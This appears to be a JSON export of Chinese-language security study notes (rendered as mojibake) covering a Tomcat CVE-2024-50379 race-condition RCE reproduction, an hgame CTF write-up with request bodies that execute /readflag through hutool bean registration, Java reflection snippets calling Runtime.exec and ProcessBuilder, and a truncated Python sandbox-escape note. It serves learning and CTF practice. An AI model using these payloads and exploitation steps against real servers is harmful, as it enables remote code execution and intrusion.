[{"title":"CVE-2024-50379-Tomcat-rce","url":"/2025/11/02/CVE-2024-50379-Tomcat-rce/","content":"ğŸ¤” æ­¤æ¼æ´æœ‰ä¸ªå‰ç”Ÿ CVE-2017-12615\nåœ¨ Apache Tomcat 7.0.0 - 7.0.79 èŒƒå›´ä¸­ï¼Œå¦‚æœ web.xml æ–‡ä»¶ä¸­ï¼Œreadonly è¢«è®¾ç½®æˆ falseï¼Œæˆ‘ä»¬å°±èƒ½ç”¨ put æ–¹æ³•(å‰ææ˜¯æ²¡è¢«ç¦ç”¨)ä¸Šä¼ ä¸€ä¸ªç²¾å¿ƒæ‰“é€ çš„ jsp æ–‡ä»¶ç›´æ¥æ¥è¾¾åˆ°ä¸Šä¼  webshell çš„ç›®çš„ï¼Œç®€å•ç²—æš´\nä¸æ˜¯æœ¬æ¬¡é‡ç‚¹ï¼Œä¸å¤šè¿°\næ¥ä¸‹æ¥æ˜¯å¤ç°éƒ¨åˆ† ï¼š\nç¯å¢ƒï¼šé¦–å…ˆæˆ‘ä»¬éœ€è¦ windows ç¯å¢ƒï¼Œåªæœ‰å¯¹å¤§å°ä¸æ•æ„Ÿçš„ç³»ç»Ÿæ‰èƒ½æˆåŠŸ rce\nå—å½±å“çš„ Apache Tomcat ç‰ˆæœ¬åŒ…æ‹¬ï¼š\n\n11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt; 11.0.2\n10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt; 10.1.34\n9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt; 9.0.98()\n\nå¤ç°ï¼šä¸‹è½½æœ‰æ´çš„ç‰ˆæœ¬åï¼Œæˆ‘ä»¬éœ€è¦å…ˆè®¾ç½®å…¶ä¸­çš„ web.xmlï¼Œåœ¨å…¶ä¸­æ·»åŠ ä¸€ä¸ªå‚æ•°\n\nå°† readonly æŒ‡å®šä¸º falseï¼Œè¿™æ ·æ‰èƒ½è®© defultServlet å…è®¸ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨\nç„¶åç›´æ¥ç‚¹å‡» startup.bat å¯åŠ¨ï¼Œè¿™é‡Œå¯èƒ½ä¼šç¼–ç é”™è¯¯ï¼Œå› ä¸º windows ä¸€èˆ¬ä½¿ç”¨ GBKï¼Œæˆ‘ä»¬éœ€è¦åœ¨ logging.properties æ–‡ä»¶ä¸­ä¿®æ”¹ä¸€ä¸‹ç¼–ç æ–¹å¼\n\nç›´æ¥åŒå‡» startup.bat å¯åŠ¨\n\nå¡åœ¨è¿™ä¹Ÿæ²¡äº‹ï¼Œç›´æ¥è®¿é—®æœ¬åœ°çš„ 8080 ç«¯å£ï¼Œå³å¯\nå½“æˆ‘ä»¬å°è¯•å°†ä¸€ä¸ª a.jsp æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œä¼šå‘ç° 404 é”™è¯¯ã€\nTomcat æ˜¯ç¦æ­¢ç›´æ¥ä¸Šä¼  .jsp æ–‡ä»¶ï¼Œåç¼€ä¸ºå°å†™çš„ .jsp æ–‡ä»¶ï¼Œå½“ç”¨æˆ·è®¿é—®æ—¶ï¼ŒTomcat ä¼šäº¤ç»™ jspServlet å¤„ç†ï¼Œè€Œä»–å¹¶ä¸å¤„ç† put æ–¹æ³•ï¼Œå¯¼è‡´ä¸Šä¼ å¤±è´¥ã€‚\n\næ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè®©æ–‡ä»¶èƒ½è¢« put ä¸Šå»ï¼Œæˆ‘ä»¬é€‰æ‹©å°†æ–‡ä»¶æ”¹ä¸º a.Jsp è¿™æ ·å¤„ç†ä»–çš„å°±æ˜¯ defaultsevrletï¼Œæ–‡ä»¶å¯ä»¥é¡ºåˆ©ä¸Šä¼ \n\nå›åº” 201(å³ä¸Šä¼ æˆåŠŸ)ï¼Œæœ¬åœ°ä¹Ÿèƒ½çœ‹è§\n\nï¼ˆè¿™æ—¶å€™åº”è¯¥å¯ä»¥å†™ä¸ª webshellï¼Œç”¨èšå‰‘ç›´æ¥è¿ä¸Šï¼ˆæ²¡è¯•è¿‡\nä½†æ˜¾ç„¶æˆ‘ä»¬å¯ä»¥åšçš„æ›´å¤šï¼Œæ¥ä¸‹æ¥è¿›è¡Œ rce\nè¿™æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶ä¸­æœ‰ç²¾å¿ƒæ„é€ çš„å†…å®¹ï¼Œæˆ‘ä»¬å¦‚ä½•è®©ä»–æ‰§è¡Œå‘¢\nï¼ˆæœ¬æ¥æˆ‘æ˜¯ä½¿ç”¨ yakit å¼€å¯å¤šä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªä¸æ–­ put .Jsp æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªä¸æ–­ GET .jsp æ–‡ä»¶æ¥å®ç°æ¡ä»¶ç«äº‰è¾¾æˆ rceï¼Œä½†æ˜¯ä¸€ç›´ä¸æˆåŠŸï¼Œè¿™é‡Œä½¿ç”¨ä½¬ä½¬çš„ poc å®Œæˆ rce\nå·¥å…·ä½œè€…çš„ github åœ°å€ï¼šhttps://github.com/SleepingBag945/CVE-2024-50379\n\nå½“æˆ‘ä»¬è®¿é—®åœ°å€æ—¶ï¼ŒæˆåŠŸå¼¹å‡ºäº†è®¡ç®—å™¨\n\nå·¥å…·æºç åˆ†æï¼šè‡ªå·±çœ‹\nä¸»è¦åœ¨ main å‡½æ•°ä¸­ï¼Œé€šè¿‡å¼€å¯ä¸‰ä¸ªçº¿ç¨‹ï¼Œä¸¤ä¸ªä¸æ–­ putï¼Œä¸€ä¸ª getï¼Œé‡å¤åˆ°æˆåŠŸ\nåŸç†è§£é‡Šï¼šå¯¹äº win æ¥è¯´ï¼Œa.Jsp å’Œ a.jsp æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼ˆè¿™ä¸ªä¹Ÿå¯ä»¥ç ”ç©¶ windows æ‰¾æºç çš„æ–¹æ³•çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿™é‡Œä¸å¤šè§£é‡Šã€‚\næˆ‘ä»¬è¦åœ¨ GET a.jsp æ—¶è®© JspServlet æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œæ¶‰åŠ AbstractFileResourceSet çš„ file æ–¹æ³•\ntry &#123;    // JRE æ–¹æ³•    canPath = file.getCanonicalPath();    &#125; catch (IOException var6) &#123;    &#125;if (canPath != null &amp;&amp; canPath.startsWith(this.canonicalBase)) &#123;    String absPath = this.normalize(file.getAbsolutePath());    ....    if (!canPath.equals(absPath)) &#123;        if (!canPath.equalsIgnoreCase(absPath)) &#123;            this.logIgnoredSymlink(this.getRoot().getContext().getName(), absPath, canPath);&#125;            return null;        &#125; else &#123;            return file;         &#125; //å¤§æ¦‚å°±è¿™äº›\n\næˆ‘ä»¬å‘ç°åªæœ‰å½“ abspath&#x3D;canpath æ—¶æ‰ä¼šè¿”å›æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ‰ä¼šæ‰§è¡Œä»£ç \nå…¶ä¸­ abs path æ˜¯ç”¨æˆ·è¾“å…¥çš„è·¯å¾„æ‹¼æ¥å¤„ç†åçš„æœ¬åœ°ç»å¯¹è·¯å¾„\nå…¶ä¸­ can path æ˜¯ JRE ç±» WinNTFileSystem JNI&#x2F;cache å¤„ç†åå¾—åˆ°çš„è·¯å¾„ï¼ˆå¦‚æœç¼“å­˜å¯ç”¨å°±ä¼šä»å…¶ä¸­è·å–\nå½“æˆ‘ä»¬ PUT ä¸€ä¸ª a.Jsp æ–‡ä»¶ä¸Šå»æ—¶ï¼Œæ˜¾ç„¶ abspath å’Œ canpath éƒ½æ˜¯ a.Jsp\nå½“æˆ‘ä»¬ GET a.jsp æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å·²ç» PUT a.Jspï¼Œé‚£ä¹ˆï¼Œabspath ä¼šæ˜¯ a.jsp canpath ä¼šæ˜¯ a.Jsp(ä»ç¼“å­˜ä¸­è¯»)ï¼Œé‚£ä¹ˆä¸é€šè¿‡æ£€æµ‹ï¼Œå°±ä¸ä¼šè¿”å›æ–‡ä»¶è€Œå¦‚æœæˆ‘ä»¬ PUT çš„ a.Jsp è¿˜æ²¡è½åœ° é‚£ä¹ˆ abspath canpath éƒ½ä¼šæ˜¯ a.jsp è¿™æ ·ä¼šè¿”å›æ–‡ä»¶\nä½†å¾ˆæ˜¾ç„¶ä¸ PUT å°±ä¸ä¼šæœ‰æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬æŸ¥çœ‹ä»£ç å¯ä»¥çŸ¥é“ï¼Œè¿™ç§æ£€æŸ¥ä¸ä¼šåªæœ‰ä¸€æ¬¡è€Œæ˜¯é‡å¤å¥½å‡ æ¬¡\norg.apache.catalina.webresources#getResourcecacheEntry.validateResource(useClassLoaderResources);//åœ¨ JspServlet åç»­å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå†æ¬¡æŠµè¾¾ AbstractFileResourceSet file æ–¹æ³•//ç±»ä¼¼çš„è¿‡ç¨‹ä¼šé‡å¤å¥½å‡ æ¬¡\n\nåœ¨ JspServlet è¯»å–æ–‡ä»¶å‰ä¼šç»è¿‡å¾ˆå¤šæ¬¡çš„æ£€æŸ¥\næ‰€ä»¥ï¼Œæˆ‘ä»¬è¦ä¿è¯åœ¨å®ƒæ£€æŸ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„ abspath canpath è¦ä¸€ç›´ä¿æŒ a.jsp è€Œåœ¨è¿”å›æ–‡ä»¶å‰ä¸€åˆ»ï¼Œæˆ‘ä»¬çš„ PUT a.Jsp æ–‡ä»¶è¦åˆšå¥½è½åœ°ï¼Œè¿™æ ·æ‰èƒ½å®Œç¾æ‰§è¡Œï¼Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ªæ¡ä»¶ç«äº‰\n","tags":["CTF"]},{"title":"hgame-SigninJava","url":"/2025/11/01/hgame-SigninJava/","content":"javaï¼Œæ‰“å¼€ jar åŒ…å¯ä»¥çœ‹åˆ°ä»£ç ï¼Œæ‰¾åˆ°ä¸€ä¸ªç±»\n@RequestMapping(&#123;&quot;/api&quot;&#125;)@Controller_/* loaded from: SigninJava.jar:BOOT-INF/classes/icu/Liki4/signin/controller/APIGatewayController.class */_**public** **class** APIGatewayController &#123;    @RequestMapping(value = &#123;&quot;/gateway&quot;&#125;, method = &#123;RequestMethod.POST&#125;)    @ResponseBody    **public** BaseResponse doPost(HttpServletRequest request) **throws** Exception &#123;        **try** &#123;            String body = IOUtils.toString(request.getReader());            Map&lt;String, Object&gt; map = (Map) JSON.parseObject(body, Map.**class**);            String beanName = (String) map.get(&quot;beanName&quot;);            String methodName = (String) map.get(JsonEncoder.METHOD_NAME_ATTR_NAME);            Map&lt;String, Object&gt; params = (Map) map.get(&quot;params&quot;);            **if** (StrUtil.containsAnyIgnoreCase(beanName, &quot;flag&quot;)) &#123;                **return** **new** BaseResponse(403, &quot;flagTestService offline&quot;, **null**);            &#125;            Object result = InvokeUtils.invokeBeanMethod(beanName, methodName, params);            **return** **new** BaseResponse(200, **null**, result);        &#125; **catch** (Exception e) &#123;            **return** **new** BaseResponse(500, ((Throwable) Objects.requireNonNullElse(e.getCause(), e)).getMessage(), **null**);        &#125;    &#125;&#125;\n\ndopost ä¸­æ¥å—æ•°æ®ï¼Œé€šè¿‡ InvokeUtils.invokeBeanMethod è°ƒç”¨æŒ‡å®šçš„ Bean æ–¹æ³•\næŸ¥çœ‹ hutool çš„æ–‡æ¡£ï¼Œå‘ç°å…¶ä¸­æœ‰ä¸€ä¸ª RuntimeUtilï¼Œå…¶ä¸­æä¾›äº†å‘½ä»¤æ‰§è¡Œæ–¹æ³•ï¼Œä½†æ˜¯ï¼Œåªæœ‰æ³¨å†Œåˆ° Spring å®¹å™¨ä¸­çš„ Bean æ‰èƒ½è¢« Spring ç®¡ç†ï¼Œå¹¶é€šè¿‡ä¾èµ–æ³¨å…¥çš„æ–¹å¼ä½¿ç”¨ï¼Œè€Œ RuntimeUtil æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ª Spring Beanï¼Œå› æ­¤éœ€è¦é€šè¿‡åŠ¨æ€æ³¨å†Œå°†å…¶åŠ å…¥ Spring å®¹å™¨\nå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè°ƒç”¨ cn.hutool.extra.spring.SpringUtil ä¸­çš„ registerBean æ–¹æ³•æ¥å‘å®¹å™¨ä¸­æ·»åŠ  RuntimeUtil å®ä¾‹åä¸å¯å¸¦æœ‰ flag\næ„é€ è¯·æ±‚ä½“\n&#123;&quot;beanName&quot;:&quot;cn.hutool.extra.spring.SpringUtil&quot;,&quot;methodName&quot;:&quot;registerBean&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;execCmd&quot;,&quot;arg1&quot;:&#123;&quot;@type&quot;:&quot;cn.hutool.core.util.RuntimeUtil&quot;&#125;&#125;&#125;\n\nåœ¨è°ƒç”¨ execCmd\n&#123;&quot;beanName&quot;:&quot;execCmd&quot;,&quot;methodName&quot;:&quot;execForStr&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;utf-8&quot;,&quot;arg1&quot;:[&quot;/readflag&quot;]&#125;&#125;\n\nè¿™é‡Œ&#x2F;flag è¢«åŠ æƒé™äº†ï¼Œä¸èƒ½ç›´æ¥ cat\n","tags":["CTF"]},{"title":"javaå®‰å…¨--åå°„(1)","url":"/2025/11/01/java%E5%AE%89%E5%85%A8--%E5%8F%8D%E5%B0%84(1)/","content":"\nå‚è€ƒæ–‡ç« ï¼šçŸ¥è¯†æ˜Ÿçƒ phithon çš„æ–‡ç« ï¼ˆjava å®‰å…¨æ¼«è°ˆ - 01.åå°„ç¯‡(1)ï¼‰å‚è€ƒæ–‡ç« ï¼šjavaguide\n\nåå°„ï¼šjava åå°„å¯ä»¥åŠ¨æ€è·å–ç±»ä¿¡æ¯ï¼Œå¯¹è±¡é€šè¿‡åå°„è·å–ç±»ï¼Œç±»åå°„è·å–æ‰€æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬ç§æœ‰ï¼Œp ç‰›è¿™é‡Œç»™åŠ¨æ€ç‰¹æ€§ä¸€ä¸ªå®šä¹‰ï¼Œâ€œä¸€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡é‡ï¼Œå°†ä¼šå¯¼è‡´ è¿™æ®µä»£ç äº§â½£ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–ï¼Œæˆ‘ç§°ä¹‹ä¸ºåŠ¨æ€ç‰¹æ€§ â€\nç™½å«–ä¸€æ®µä»£ç \npublic void execute(String className, String methodName) throws Exception &#123;  Class clazz = Class.forName(className);             clazz.getMethod(methodName).invoke(clazz.newInstance()); &#125;\n\n\nforName æ–¹æ³•è·å–ç±»æ­¤å¤–è¿˜æœ‰åˆ«çš„æ–¹æ³•ï¼Œobj.getClass()è¿™ä¸ªæ–¹æ³•é’ˆå¯¹ä¸‹æ–‡æœ‰ç±»å¯¹åº”å®ä¾‹ï¼Œé€šè¿‡å®ä¾‹è·å–å¯¹åº”ç±»\n\ngetmethod æ–¹æ³•è·å–ç±»çš„æ–¹æ³•\n\ninvoke æ–¹æ³•æ‰§è¡Œå‡½æ•°\n\nnewInstance æ–¹æ³•å®ä¾‹åŒ–ç±»å¯¹è±¡\n\n\né‚£æˆ‘ä»¬æƒ³è·å– Runtime ç±»ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç»™åˆ°çš„å®ä¾‹ï¼Œé€šè¿‡ obj.getClass().forName(java.lang.Runtime)è·å–åˆ° Runtime ç±»\nforName æ–¹æ³•è¿˜æœ‰é‡è½½ï¼Œ forName(String name, boolean initialize, ClassLoader loader)æˆ‘ä»¬å¸¸ç”¨çš„å®é™…ä¸Šæ˜¯\nforName(classname, true, currentLoader)ã€‚ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åŠ è½½å™¨ï¼Œå‘Šè¯‰è™šæ‹Ÿæœºæ€ä¹ˆåŠ è½½\njava åŠ è½½å™¨æ¶‰åŠåˆ°çš„ä¸œè¥¿æœ‰ç‚¹å¤šï¼Œå…ˆç²—ç•¥äº†è§£ä¸€ä¸‹\nè§„åˆ™ï¼š ç”±äº java é‡‡ç”¨å»¶è¿ŸåŠ è½½æœºåˆ¶åªæœ‰å½“ç¨‹åºéœ€è¦ä½¿ç”¨æŸä¸ªç±»æ—¶ï¼Œæ‰ä¼šç”±ç±»åŠ è½½å™¨åŠ è½½è¯¥ç±»ã€‚\nä½œç”¨ï¼š åŠ¨æ€åŠ è½½ java ç±»çš„å­—èŠ‚ç åˆ°è™šæ‹Ÿæœºä¸­ï¼Œè¿˜å¯ä»¥åŠ è½½ Java åº”ç”¨æ‰€éœ€çš„èµ„æºå¦‚æ–‡æœ¬ã€å›¾åƒã€é…ç½®æ–‡ä»¶ã€è§†é¢‘ç­‰ç­‰æ–‡ä»¶èµ„æº\ninitializeæˆ‘ä»¬çŸ¥é“è¿™ä¸ªå‚æ•°è´Ÿè´£ç±»æ˜¯å¦åˆå§‹åŒ–ï¼Œé‚£ç±»çš„åˆå§‹åŒ–æœ‰ä»€ä¹ˆç”¨å‘¢\nç™½å«–ä¸€æ®µä»£ç ï¼š\npublic class TrainPrint &#123;     &#123;              System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass());     &#125;     static &#123;              System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class);     &#125;     public TrainPrint() &#123;              System.out.printf(&quot;Initial %s\\n&quot;, this.getClass());     &#125;&#125;\n\nå½“è¿™ä¸ªç±»è¢«åˆå§‹åŒ–æ—¶ï¼Œé¦–å…ˆè°ƒç”¨ staticï¼Œç„¶åè°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•ï¼Œä¹‹åæ˜¯{}ï¼Œæœ€åæ˜¯è‡ªå·±çš„æ„é€ æ–¹æ³•\næ ¹æ®è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå‘ç°å½“ forName()æ–¹æ³•ä¸­çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¦‚æœèƒ½å°†ä¸€ä¸ªç±»æ”¾åˆ°è¢«æ”»å‡»æœºä¸­å¹¶åœ¨é‡Œé¢ static éƒ¨åˆ†å†™å…¥æ¶æ„ä»£ç ï¼Œå°±èƒ½è¾¾åˆ°æ”»å‡»ç›®çš„\n","tags":["CTF"]},{"title":"javaå®‰å…¨--åå°„(2)","url":"/2025/11/02/java%E5%AE%89%E5%85%A8--%E5%8F%8D%E5%B0%84(2)/","content":"\nå‚è€ƒæ–‡ç« ï¼šä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ phithon çš„æ–‡ç« ï¼ˆjava å®‰å…¨æ¼«è°ˆ - 02.åå°„ç¯‡(2)ï¼‰\n\nä¸Šæ–‡è¡¥å……ï¼šåœ¨è¯„è®ºåŒºçœ‹åˆ°äº†ä¸€ä½å¸ˆå‚…è¯´ï¼š\nClassLoader.getSystemClassLoader().loadClass(â€œjava.lang.Runtimeâ€) ç±»ä¼¼çš„åˆ©ç”¨ç±»åŠ è½½æœºåˆ¶ï¼Œä¹Ÿå¯ä»¥è·å– Class å¯¹è±¡ï¼Œä½†ç”¨è¿™ä¸ªæ–¹æ³•ä¸ä¼šåƒä½¿ç”¨ forName ä¸€æ ·åˆå§‹åŒ– ï¼Œç›®å‰æ²¡å‘ç°æœ‰ä»€ä¹ˆç‰¹æ®Šç”¨å¤„ã€‚å”¯ä¸€æƒ³åˆ°çš„å¯èƒ½æ˜¯ç»•æ²™ç›’èƒ½ç”¨ï¼Ÿ\nå§‹ï¼šå…³äº$ç¬¦å· ï¼šç”¨äºæŸ¥æ‰¾å†…éƒ¨ç±»ï¼Œæˆ‘ä»¬çŸ¥é“javaçš„ç±»ä¸­å¯ä»¥å®šä¹‰å†…éƒ¨ç±»ï¼Œç®€å•æ¥è¯´æˆ‘ä»¬å¯ä»¥æŠŠå†…éƒ¨ç±»è§†ä¸ºå¦ä¸€ä¸ªç±»ï¼Œé€šè¿‡forName(class1$class2)æ¥è·å–å†…éƒ¨ç±»\næˆ‘ä»¬å¯ä»¥ç»§ç»­åå°„è·å–å±æ€§ã€æ–¹æ³•ï¼š\ngetField(String name)//è·å–**å•ä¸ª** public çš„å±æ€§getDeclaredField(String name)//è·å–**å•ä¸ª**åœ¨å½“å‰ç±»ä¸­å£°æ˜çš„**ä»»æ„**å±æ€§ï¼ˆåŒ…æ‹¬ privateï¼‰getMethod(String name, Class&lt;?&gt;... parameterTypes)//è·å–**å•ä¸ª** public çš„æ–¹æ³•getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)//è·å–**å•ä¸ª**åœ¨å½“å‰ç±»ä¸­å£°æ˜çš„**ä»»æ„**æ–¹æ³•ï¼ˆåŒ…æ‹¬ privateï¼‰\n\nimport java.lang.reflect.Field;import java.lang.reflect.Method;//å®šä¹‰ä¸€ä¸ªç®€å•çš„ç±»public class Person &#123;    private int age;    private void tellSecret() &#123;    &#125;&#125;//æµ‹è¯•ä»£ç public class Demo &#123;    public static void main(String[] args) &#123;        Class&lt;?&gt; personClass = Person.class;        // è·å– age çš„å±æ€§        Field ageField = personClass.getDeclaredField(&quot;age&quot;);        System.out.println(ageField.getName());        // è·å– tellSecret çš„æ–¹æ³•        Method secretMethod = personClass.getDeclaredMethod(&quot;tellSecret&quot;);        System.out.println(secretMethod.getName());    &#125;&#125;\n\nè¿˜æœ‰é€šè¿‡å®ä¾‹ï¼š\nimport java.lang.reflect.Method;public class Demo &#123;    public static void main(String[] args) &#123;        Class&lt;?&gt; personClass = Person.class;        Object personInstance = personClass.newInstance();        // 2. è·å–ç§æœ‰æ–¹æ³•        Method secretMethod = personClass.getDeclaredMethod(&quot;saySecret&quot;);        // å¿…é¡»è®¾ç½®å¦åˆ™æ— æ³•è°ƒç”¨ private æ–¹æ³•        secretMethod.setAccessible(true);        // 4. åœ¨æŒ‡å®šå®ä¾‹ä¸Šè°ƒç”¨æ­¤æ–¹æ³•        secretMethod.invoke(personInstance);    &#125;&#125;\n\nclass.newInstance()æ˜¯è°ƒç”¨æ— å‚æ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ personClass.getDeclaredConstructor().newInstance();æ¥é€‰æ‹©æ„é€ æ–¹æ³•\næ³¨æ„ï¼šç›´æ¥ class.newInstance()å¯èƒ½ä¼šå¤±è´¥ï¼ŒåŸå› æœ‰äºŒï¼Œä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•æˆ–å…¶æ„é€ æ–¹æ³•ä¸ºç§æœ‰\nå¯¹äºæ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•çš„ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ getDeclaredConstructor()è·å–å…¶æœ‰å‚æ„é€ æ–¹æ³•ï¼Œä¾‹å¦‚ä¾‹å¦‚ getDeclaredConstructor(String.class, int.class)\nå¯¹äºæ„é€ æ–¹æ³•ç§æœ‰ï¼Œé‚£æˆ‘ä»¬å¾—ä½¿ç”¨ç±»ä¸­çš„æ–¹æ³•æ¥è·å–å¯¹è±¡\np ç‰›ç”¨ Runtime åšä¾‹å­\nClass clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),  &quot;calc.exe&quot;);\n\nmethod.invoke([1], [2], [3], [4]â€¦)\ninvoke æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»ï¼ˆé™æ€æ–¹æ³•ï¼‰æˆ–è€…ç±»å¯¹è±¡ï¼ˆæ™®é€šæ–¹æ³•ï¼‰\nä¸Šé¢ä»£ç æ‹†å¼€åå°±æ˜¯\nClass clazz = Class.forName(&quot;java.lang.Runtime&quot;);  Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);  Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);  Object runtime = getRuntimeMethod.invoke(clazz);  execMethod.invoke(runtime, &quot;calc.exe&quot;);\n\nç¬¨ç¬¨çš„è„‘è¢‹æœªå“åº”äº†\næ­£æ–‡\n","tags":["CTF"]},{"title":"javaå®‰å…¨--åå°„(3)","url":"/2025/11/02/java%E5%AE%89%E5%85%A8--%E5%8F%8D%E5%B0%84(3)/","content":"\nå‚è€ƒæ–‡ç« ï¼šä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ phithon çš„æ–‡ç« ï¼ˆjava å®‰å…¨æ¼«è°ˆ - 03.åå°„ç¯‡(3)ï¼‰\n\nåˆ©ç”¨ä¹‹ä¸€ï¼šæˆ‘ä»¬å·²ç»çŸ¥é“äº†ï¼Œé€šè¿‡ getConstructor å¯ä»¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œæ— è®ºå…¶æ˜¯å¦æœ‰å‚ï¼Œ\nè¿™é‡Œç”¨ä¸€ä¸ªæ–°çš„æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ ProcessBuilder\nç™½å«–ä¸€æ®µä»£ç ï¼š\n2  Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);  ((ProcessBuilder)  clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start();//(ProcessBuilder)è¿™ä¸ªæ˜¯ç±»å‹è½¬æ¢ï¼Œå› ä¸ºè¿”å›çš„æ˜¯objç±»å‹\n\nè¿™é‡Œï¼Œæˆ‘ä»¬é€šè¿‡ start()ç›´æ¥æ‰§è¡Œäº†å‘½ä»¤\nå¦‚ä¸ä½¿ç”¨å¼ºåˆ¶è½¬æ¢ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åå°„æ¥è·å– start()æ–¹æ³•\nClass clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);  clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;)));\n\np ç‰›è¯´â€ä½†æ˜¯ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œå‰é¢è¿™ä¸ª Payload ç”¨åˆ°äº† Java é‡Œçš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ—¶å€™ï¼ˆåœ¨è¡¨è¾¾å¼ä¸Šä¸‹æ–‡ä¸­ï¼‰æ˜¯æ²¡æœ‰è¿™ç§è¯­æ³•çš„ã€‚â€\næ€è€ƒäº†ä¸€ä¸‹ï¼Œå¯èƒ½æ˜¯æŒ‡åœ¨æ²™ç®±ç¯å¢ƒä¸­æ— æ³•ä½¿ç”¨å¼ºåˆ¶è½¬æ¢\nå…¶äºŒï¼šProcessBuilder è¿˜æœ‰ä¸€ç§é‡è½½æ–¹å¼ public ProcessBuilder(Stringâ€¦ command)\nè¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ°å¯å˜é•¿å‚æ•° ï¼Œå› ä¸ºæˆ‘ä»¬å‚æ•°æ•°é‡æ˜¯ä¸ç¡®å®šçš„ï¼Œjava å¤„ç†å¯å˜é•¿å‚æ•°çš„æ–¹æ³•æ˜¯ç¼–è¯‘æˆæ•°ç»„\npublic void hello(String[] names) &#123;&#125;public void hello(String...names) &#123;&#125;//ä¸¤ç§ä¸€æ ·\n\näºæ˜¯ï¼Œæˆ‘ä»¬ä¼ å‚ç»™ getConstructor åªéœ€è¦ä¼  String[].class è¿™æ ·å°±èƒ½ç”¨ç¬¬äºŒç§é‡è½½æ–¹æ³•\n","tags":["CTF"]},{"title":"pyæ ˆå¸§é€ƒé€¸","url":"/2025/11/02/py%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/","content":"\nå‚è€ƒæ–‡ç« https://xz.aliyun.com/news/13075https://forum.butian.net/share/4114https://docs.python.org/zh-cn/3/reference/datamodel.html#traceback-objects\n\nç”Ÿæˆå™¨é€ƒé€¸ç”Ÿæˆå™¨ç”Ÿæˆå™¨(Generator) æ˜¯ py ä¸­ä¸€ä¸ªç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œç”¨ yield å®šä¹‰\nyeild ç”¨äºäº§ç”Ÿä¸€ä¸ªå€¼ï¼Œä¿ç•™å½“å‰è¿è¡ŒçŠ¶æ€çš„åŒæ—¶æš‚åœå‡½æ•°æ‰§è¡Œï¼Œå¹¶åœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨ç”Ÿæˆå™¨æ—¶ï¼Œå‡½æ•°ä»ä¸Šæ¬¡æš‚åœçš„ä½ç½®ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ª yeild å­—æ®µæˆ–å‡½æ•°ç»“æŸ\ndef f():    a=1    while True:        yield a        a+=1f=f()print(next(f)) #1print(next(f)) #2#è¿™é‡Œç”Ÿæˆå™¨è®°ä½äº†ä¸Šæ¬¡çš„çŠ¶æ€ï¼Œæ‰€ä»¥ä¼šè¾“å‡º2\n\nç»™ a åŠ èŒƒå›´å¯ä»¥ç”¨ for è¯­å¥ä¸€æ¬¡æ€§è¾“å‡º\ndef f():    a=1    for i in range(100):        yield a        a+=1f=f()for value in f:    